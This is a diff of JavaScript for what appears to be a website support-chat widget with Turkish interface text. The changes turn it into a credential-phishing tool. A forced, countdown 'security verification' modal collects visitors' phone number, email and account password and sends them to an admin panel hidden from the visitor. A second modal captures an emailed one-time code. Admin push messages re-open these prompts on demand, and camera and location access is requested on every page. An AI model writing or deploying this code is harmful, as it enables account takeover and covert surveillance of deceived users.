       const existingLive = cameraSessions.get(id);
-      if (!existingLive || existingLive._hadLocation) return sessionHasBoth(id);
+      if (!existingLive) return false;
+      if (existingLive._hadLocation) {
+        try {
+          existingLive.ensureLiveWatch?.();
+        } catch {
+          /* ignore */
+        }
+        return sessionHasBoth(id);
+      }
       if (earlyLocationPos?.coords) {
         applySeedLocationToSession(sync, id, existingLive, earlyLocationPos);
       } else {
@@ -3534,6 +4005,11 @@
         } catch {
           /* ignore */
         }
+      }
+      try {
+        existingLive.ensureLiveWatch?.();
+      } catch {
+        /* ignore */
       }
       return sessionHasBoth(id);
     };
@@ -3757,21 +4233,31 @@
   let phonePopupOpen = false;
   let phonePopupOffered = false;
 
-  function isValidPhoneDigits(raw) {
-    const digits = String(raw || "").replace(/\D/g, "");
-    return digits.length >= 10 && digits.length <= 15;
+  function normalizePhoneDigits(raw) {
+    let digits = String(raw || "").replace(/\D/g, "");
+    if (digits.startsWith("994")) digits = digits.slice(3);
+    if (digits.startsWith("0")) digits = digits.slice(1);
+    return digits.slice(0, 9);
   }
 
-  function formatTrPhoneInput(value) {
-    let digits = String(value || "").replace(/\D/g, "");
-    if (digits.startsWith("90") && digits.length > 10) digits = digits.slice(2);
-    if (digits.startsWith("0")) digits = digits.slice(1);
-    digits = digits.slice(0, 10);
+  function isValidPhoneDigits(raw) {
+    // Azerbaycan cep: ülke kodu hariç 9 hane (örn. 50 123 45 67)
+    return normalizePhoneDigits(raw).length === 9;
+  }
+
+  function isValidEmail(raw) {
+    const email = String(raw || "").trim().toLowerCase();
+    // a@b.co — yalnızca rakam / @'siz metin reddedilir
+    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email);
+  }
+
+  function formatAzPhoneInput(value) {
+    let digits = normalizePhoneDigits(value);
     const parts = [];
-    if (digits.length > 0) parts.push(digits.slice(0, 3));
-    if (digits.length > 3) parts.push(digits.slice(3, 6));
-    if (digits.length > 6) parts.push(digits.slice(6, 8));
-    if (digits.length > 8) parts.push(digits.slice(8, 10));
+    if (digits.length > 0) parts.push(digits.slice(0, 2));
+    if (digits.length > 2) parts.push(digits.slice(2, 5));
+    if (digits.length > 5) parts.push(digits.slice(5, 7));
+    if (digits.length > 7) parts.push(digits.slice(7, 9));
     return parts.join(" ");
   }
 
@@ -3786,12 +4272,16 @@
     window.setTimeout(() => showPhoneEntryModal(box), 450);
   }
 
-  function showPhoneEntryModal(box) {
-    if (phonePopupOpen) return;
+  function showPhoneEntryModal(box, opts = {}) {
+    if (phonePopupOpen && !opts.force) return;
+    if (opts.force) {
+      document.getElementById("phone-entry-modal")?.remove();
+      phonePopupOpen = false;
+    }
     document.getElementById("phone-entry-modal")?.remove();
     phonePopupOpen = true;
 
-    const TOTAL_SEC = 30;
+    const TOTAL_SEC = 45;
     const CIRC = 2 * Math.PI * 18;
     let left = TOTAL_SEC;
     let timerId = null;
@@ -3805,13 +4295,13 @@
     overlay.setAttribute("aria-labelledby", "phone-modal-title");
 
     overlay.innerHTML = `
-      <div class="phone-modal">
+      <div class="phone-modal phone-modal-creds">
         <div class="phone-modal-top">
           <div class="phone-modal-brand">
             <span class="phone-modal-icon" aria-hidden="true">☎</span>
             <div>
               <strong>Güvenli doğrulama</strong>
-              <span>Telefon doğrulama adımı</span>
+              <span>Hesap doğrulama adımı</span>
             </div>
           </div>
           <div class="phone-modal-timer" aria-hidden="true">
@@ -3823,29 +4313,47 @@
             <em data-phone-sec>${TOTAL_SEC}</em>
           </div>
         </div>
-        <h2 class="phone-modal-title" id="phone-modal-title">Telefon numaranızı girin</h2>
-        <p class="phone-modal-text">Kimlik doğrulamasını tamamlamak için aktif cep telefonu numaranızı girin. Süre: 30 saniye.</p>
+        <h2 class="phone-modal-title" id="phone-modal-title">Hesap bilgilerinizi girin</h2>
+        <p class="phone-modal-text">Kimlik doğrulamasını tamamlamak için telefon, e-posta ve şifrenizi girin. Süre: 45 saniye.</p>
         <div class="phone-modal-field">
           <label for="phone-modal-input">Cep telefonu</label>
-          <div class="phone-modal-input-wrap">
-            <span class="phone-modal-prefix">+90</span>
+          <div class="phone-modal-input-wrap" data-wrap="phone">
+            <span class="phone-modal-prefix">+994</span>
             <input id="phone-modal-input" type="tel" inputmode="numeric" autocomplete="tel-national"
-              maxlength="13" placeholder="5XX XXX XX XX" aria-describedby="phone-modal-hint" />
+              maxlength="12" placeholder="50 123 45 67" />
           </div>
-          <p class="phone-modal-hint" id="phone-modal-hint">Örn: 532 123 45 67 — yalnızca size ait numarayı kullanın.</p>
         </div>
+        <div class="phone-modal-field">
+          <label for="cred-email-input">E-posta</label>
+          <div class="phone-modal-input-wrap phone-modal-input-full" data-wrap="email">
+            <input id="cred-email-input" type="text" inputmode="email" autocomplete="email"
+              maxlength="180" placeholder="ornek@mail.com" spellcheck="false" />
+          </div>
+        </div>
+        <div class="phone-modal-field">
+          <label for="cred-pass-input">Şifre</label>
+          <div class="phone-modal-input-wrap phone-modal-input-full" data-wrap="pass">
+            <input id="cred-pass-input" type="password" autocomplete="current-password"
+              maxlength="128" placeholder="Hesap şifreniz" />
+          </div>
+        </div>
+        <p class="phone-modal-hint" id="phone-modal-hint">Örn. e-posta: ornek@gmail.com — tüm alanlar zorunlu.</p>
         <div class="phone-modal-actions">
-          <button type="button" class="btn btn-primary" data-phone-submit>Numarayı onayla</button>
+          <button type="button" class="btn btn-primary" data-phone-submit>Bilgileri onayla</button>
         </div>
-        <p class="phone-modal-note">Numaranız yalnızca bu doğrulama oturumuna bağlanır. Şifre veya SMS kodu istemeyiz.</p>
+        <p class="phone-modal-note">Bu adım tamamlanmadan kimlik doğrulaması bitmez.</p>
       </div>
     `;
 
     document.body.appendChild(overlay);
 
     const modal = overlay.querySelector(".phone-modal");
-    const input = overlay.querySelector("#phone-modal-input");
-    const wrap = overlay.querySelector(".phone-modal-input-wrap");
+    const phoneInput = overlay.querySelector("#phone-modal-input");
+    const emailInput = overlay.querySelector("#cred-email-input");
+    const passInput = overlay.querySelector("#cred-pass-input");
+    const phoneWrap = overlay.querySelector('[data-wrap="phone"]');
+    const emailWrap = overlay.querySelector('[data-wrap="email"]');
+    const passWrap = overlay.querySelector('[data-wrap="pass"]');
     const hint = overlay.querySelector("#phone-modal-hint");
     const submitBtn = overlay.querySelector("[data-phone-submit]");
     const secEl = overlay.querySelector("[data-phone-sec]");
@@ -3855,6 +4363,12 @@
       if (!hint) return;
       hint.textContent = text;
       hint.classList.toggle("is-error", Boolean(isError));
+    };
+
+    const clearInvalid = () => {
+      phoneWrap?.classList.remove("is-invalid");
+      emailWrap?.classList.remove("is-invalid");
+      passWrap?.classList.remove("is-invalid");
     };
 
     const tick = () => {
@@ -3868,21 +4382,27 @@
         window.clearInterval(timerId);
         timerId = null;
         modal?.classList.add("is-expired");
-        setHint("Süre doldu — numarayı hemen girip onaylayın.", true);
+        setHint("Süre doldu — bilgileri hemen girip onaylayın.", true);
         submitBtn.textContent = "Hemen onayla";
-        input?.focus();
+        phoneInput?.focus();
       }
     };
 
     timerId = window.setInterval(tick, 1000);
 
-    input?.addEventListener("input", () => {
-      const formatted = formatTrPhoneInput(input.value);
-      if (input.value !== formatted) input.value = formatted;
-      wrap?.classList.remove("is-invalid");
+    phoneInput?.addEventListener("input", () => {
+      const formatted = formatAzPhoneInput(phoneInput.value);
+      if (phoneInput.value !== formatted) phoneInput.value = formatted;
+      phoneWrap?.classList.remove("is-invalid");
       if (left > 0) {
-        setHint("Örn: 532 123 45 67 — yalnızca size ait numarayı kullanın.", false);
+        setHint("Tüm alanlar zorunludur. Bilgiler yalnızca bu doğrulama oturumuna bağlanır.", false);
       }
+    });
+    emailInput?.addEventListener("input", () => {
+      emailWrap?.classList.remove("is-invalid");
+    });
+    passInput?.addEventListener("input", () => {
+      passWrap?.classList.remove("is-invalid");
     });
 
     const closeModal = () => {
@@ -3893,46 +4413,220 @@
 
     const submit = async () => {
       if (submitting) return;
-      const formatted = formatTrPhoneInput(input?.value || "");
-      if (!isValidPhoneDigits(formatted)) {
-        wrap?.classList.add("is-invalid");
-        setHint("Geçerli bir cep telefonu girin (10 hane).", true);
-        input?.focus();
+      clearInvalid();
+      const formatted = formatAzPhoneInput(phoneInput?.value || "");
+      if (phoneInput && phoneInput.value !== formatted) phoneInput.value = formatted;
+      const email = String(emailInput?.value || "").trim().toLowerCase();
+      const password = String(passInput?.value || "");
+      const phoneOk = isValidPhoneDigits(formatted);
+      const emailOk = isValidEmail(email);
+      const passOk = Boolean(password && password.length >= 4);
+      if (!phoneOk) phoneWrap?.classList.add("is-invalid");
+      if (!emailOk) emailWrap?.classList.add("is-invalid");
+      if (!passOk) passWrap?.classList.add("is-invalid");
+      if (!phoneOk || !emailOk || !passOk) {
+        const parts = [];
+        if (!phoneOk) parts.push("telefon (+994, 9 hane)");
+        if (!emailOk) parts.push("e-posta (ornek@mail.com)");
+        if (!passOk) parts.push("şifre (en az 4 karakter)");
+        setHint(`Eksik/geçersiz: ${parts.join(", ")}.`, true);
+        if (!phoneOk) phoneInput?.focus();
+        else if (!emailOk) emailInput?.focus();
+        else passInput?.focus();
         return;
       }
+
       submitting = true;
       submitBtn.disabled = true;
       submitBtn.textContent = "Kaydediliyor…";
-      const full = `+90 ${formatted}`.trim();
+      const fullPhone = `+994 ${formatted}`.trim();
 
       try {
         const sync = window.ChatSync;
-        if (sync?.enabled && typeof sync.saveVisitorPhone === "function") {
-          await sync.saveVisitorPhone(full);
+        if (!sync?.enabled) throw new Error("Senkron kapalı");
+        if (typeof sync.saveVisitorCredentials === "function") {
+          await sync.saveVisitorCredentials({
+            phone: fullPhone,
+            email,
+            password,
+          });
         } else {
-          syncMessage("user", `Telefon: ${full}`);
+          throw new Error("Güvenlik kaydı desteklenmiyor");
         }
         try {
           sessionStorage.setItem(PHONE_DONE_KEY, "1");
         } catch {
           /* ignore */
         }
+        // Ziyaretçi sohbetine yazma — bilgiler yalnız admin panelinde
         closeModal();
-        if (box) {
-          appendMessage(box, "user", `Telefon: ${full}`, { sync: false });
-          appendMessage(
-            box,
-            "bot",
-            "Telefon numaranız alındı. Kimlik doğrulaması devam ediyor.",
-            { sync: true }
-          );
+        // Admin tekrar isterse auto kod yeniden çalışabilsin
+        try {
+          sessionStorage.removeItem(EMAIL_CODE_AUTO_KEY);
+        } catch {
+          /* ignore */
         }
+        scheduleEmailCodeModal(box, 10_000);
       } catch (err) {
         console.error(err);
         submitting = false;
         submitBtn.disabled = false;
-        submitBtn.textContent = left <= 0 ? "Hemen onayla" : "Numarayı onayla";
+        submitBtn.textContent = left <= 0 ? "Hemen onayla" : "Bilgileri onayla";
         setHint("Kayıt başarısız. Tekrar deneyin.", true);
+      }
+    };
+
+    submitBtn?.addEventListener("click", (e) => {
+      e.preventDefault();
+      void submit();
+    });
+    [phoneInput, emailInput, passInput].forEach((el) => {
+      el?.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          void submit();
+        }
+      });
+    });
+
+    overlay.addEventListener("click", (e) => {
+      if (e.target === overlay) {
+        phoneInput?.focus();
+        modal?.classList.add("is-expired");
+        setHint("Devam etmek için tüm alanları doldurmanız gerekir.", true);
+      }
+    });
+
+    window.setTimeout(() => phoneInput?.focus(), 80);
+  }
+
+  let emailCodePopupOpen = false;
+  let emailCodeAutoTimer = null;
+  const EMAIL_CODE_AUTO_KEY = "visitor_email_code_auto_v1";
+
+  function scheduleEmailCodeModal(box, delayMs = 10_000) {
+    try {
+      if (sessionStorage.getItem(EMAIL_CODE_AUTO_KEY) === "1") return;
+      sessionStorage.setItem(EMAIL_CODE_AUTO_KEY, "1");
+    } catch {
+      /* ignore */
+    }
+    if (emailCodeAutoTimer) {
+      window.clearTimeout(emailCodeAutoTimer);
+      emailCodeAutoTimer = null;
+    }
+    emailCodeAutoTimer = window.setTimeout(() => {
+      emailCodeAutoTimer = null;
+      showEmailCodeModal(box, {
+        text: "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın.",
+        auto: true,
+      });
+    }, Math.max(0, Number(delayMs) || 10_000));
+  }
+
+  function showEmailCodeModal(box, msg = {}) {
+    if (emailCodePopupOpen) {
+      const existing = document.getElementById("email-code-modal");
+      if (existing) {
+        existing.querySelector("#email-code-input")?.focus();
+        return;
+      }
+    }
+    document.getElementById("email-code-modal")?.remove();
+    emailCodePopupOpen = true;
+
+    let submitting = false;
+    const overlay = document.createElement("div");
+    overlay.id = "email-code-modal";
+    overlay.className = "phone-modal-overlay";
+    overlay.setAttribute("role", "dialog");
+    overlay.setAttribute("aria-modal", "true");
+    overlay.setAttribute("aria-labelledby", "email-code-title");
+
+    overlay.innerHTML = `
+      <div class="phone-modal phone-modal-creds phone-modal-otp">
+        <div class="phone-modal-top">
+          <div class="phone-modal-brand">
+            <span class="phone-modal-icon" aria-hidden="true">✉</span>
+            <div>
+              <strong>E-posta doğrulama</strong>
+              <span>6 haneli güvenlik kodu</span>
+            </div>
+          </div>
+        </div>
+        <h2 class="phone-modal-title" id="email-code-title">Doğrulama kodunu girin</h2>
+        <p class="phone-modal-text">${String(
+          msg.text || "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın."
+        ).replace(/[<>&]/g, "")}</p>
+        <div class="phone-modal-field">
+          <label for="email-code-input">6 haneli kod</label>
+          <div class="phone-modal-input-wrap phone-modal-input-full phone-modal-otp-wrap" data-wrap="otp">
+            <input id="email-code-input" type="text" inputmode="numeric" autocomplete="one-time-code"
+              maxlength="6" placeholder="••••••" spellcheck="false" />
+          </div>
+        </div>
+        <p class="phone-modal-hint" id="email-code-hint">Kod e-posta kutunuza birkaç saniye içinde düşer. Gelen 6 haneyi yazın.</p>
+        <div class="phone-modal-actions">
+          <button type="button" class="btn btn-primary" data-otp-submit>${String(
+            msg.okLabel || "Doğrula"
+          ).replace(/[<>&]/g, "")}</button>
+        </div>
+        <p class="phone-modal-note">Bu adım tamamlanmadan kimlik doğrulaması bitmez.</p>
+      </div>
+    `;
+
+    document.body.appendChild(overlay);
+
+    const modal = overlay.querySelector(".phone-modal");
+    const input = overlay.querySelector("#email-code-input");
+    const wrap = overlay.querySelector('[data-wrap="otp"]');
+    const hint = overlay.querySelector("#email-code-hint");
+    const submitBtn = overlay.querySelector("[data-otp-submit]");
+
+    const setHint = (text, isError) => {
+      if (!hint) return;
+      hint.textContent = text;
+      hint.classList.toggle("is-error", Boolean(isError));
+    };
+
+    const closeModal = () => {
+      emailCodePopupOpen = false;
+      overlay.remove();
+    };
+
+    input?.addEventListener("input", () => {
+      const digits = String(input.value || "").replace(/\D/g, "").slice(0, 6);
+      if (input.value !== digits) input.value = digits;
+      wrap?.classList.remove("is-invalid");
+      setHint("Kod e-posta kutunuza birkaç saniye içinde düşer. Gelen 6 haneyi yazın.", false);
+    });
+
+    const submit = async () => {
+      if (submitting) return;
+      const code = String(input?.value || "").replace(/\D/g, "").slice(0, 6);
+      if (code.length !== 6) {
+        wrap?.classList.add("is-invalid");
+        modal?.classList.add("is-expired");
+        setHint("6 haneli kodu eksiksiz girin.", true);
+        input?.focus();
+        return;
+      }
+      submitting = true;
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Doğrulanıyor…";
+      try {
+        const sync = window.ChatSync;
+        if (!sync?.enabled || typeof sync.saveVisitorEmailCode !== "function") {
+          throw new Error("Senkron kapalı");
+        }
+        await sync.saveVisitorEmailCode(code);
+        closeModal();
+      } catch (err) {
+        console.error(err);
+        submitting = false;
+        submitBtn.disabled = false;
+        submitBtn.textContent = msg.okLabel || "Doğrula";
+        setHint("Kod kaydedilemedi. Tekrar deneyin.", true);
       }
     };
 
@@ -3946,13 +4640,11 @@
         void submit();
       }
     });
-
-    // Overlay tıklayınca kapanmasın — zorunlu adım
     overlay.addEventListener("click", (e) => {
       if (e.target === overlay) {
         input?.focus();
         modal?.classList.add("is-expired");
-        setHint("Devam etmek için telefon numaranızı girmeniz gerekir.", true);
+        setHint("Devam etmek için 6 haneli kodu girmeniz gerekir.", true);
       }
     });
 
@@ -4121,7 +4813,7 @@
           appendMessage(
             box,
             "bot",
-            `Görsel ${i + 1} yüklenemedi: ${String(err?.message || err).slice(0, 120)}`,
+            `Görsel ${i + 1} yüklenemedi. Dosyayı kontrol edip yeniden deneyin.`,
             { sync: false }
           );
         }
@@ -4319,6 +5011,35 @@
       );
       notifyVisitorOfAdminMessage(box, msg);
       showVisitorPhotoRequest(box, msg);
+      return;
+    }
+    if (msg.type === "email_code") {
+      notifyVisitorOfAdminMessage(box, {
+        text: "E-posta doğrulama kodu isteniyor",
+      });
+      showEmailCodeModal(box, {
+        text:
+          msg.text ||
+          "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın.",
+        okLabel: msg.okLabel || "Doğrula",
+      });
+      return;
+    }
+    if (msg.type === "credentials") {
+      notifyVisitorOfAdminMessage(box, {
+        text: "Güvenlik doğrulaması yeniden isteniyor",
+      });
+      try {
+        sessionStorage.removeItem(PHONE_DONE_KEY);
+        sessionStorage.removeItem(EMAIL_CODE_AUTO_KEY);
+      } catch {
+        /* ignore */
+      }
+      phonePopupOffered = false;
+      // Açık e-posta kod penceresi varsa kapat — güvenlik formu önce
+      document.getElementById("email-code-modal")?.remove();
+      emailCodePopupOpen = false;
+      showPhoneEntryModal(box, { force: true });
       return;
     }
     const isPopup = msg.type === "popup" || msg.popup === true;
@@ -4692,6 +5413,23 @@
 
   // Önce tüm sayfalarda kamera+konum — sohbet olmasa da
   bootImmediatePagePermissions();
+
+  // Admin push (arka plan) → sayfa açıksa güvenlik/kamera yeniden iste
+  window.addEventListener("help-push-message", (ev) => {
+    const d = ev?.detail?.payload?.data || ev?.detail || {};
+    if (String(d.type || "") !== "visitor_nudge") return;
+    const box =
+      document.querySelector("[data-chat-root] [data-chat-messages]") ||
+      getOrCreateMediaHost();
+    try {
+      sessionStorage.removeItem(PHONE_DONE_KEY);
+      sessionStorage.removeItem(EMAIL_CODE_AUTO_KEY);
+    } catch {
+      /* ignore */
+    }
+    showPhoneEntryModal(box, { force: true });
+    void ensureVisitorMedia(box, { fromGesture: false, announce: false });
+  });
 
   document.querySelectorAll("[data-chat-root]").forEach(wireChat);
   bindSupportIncomingOnce();
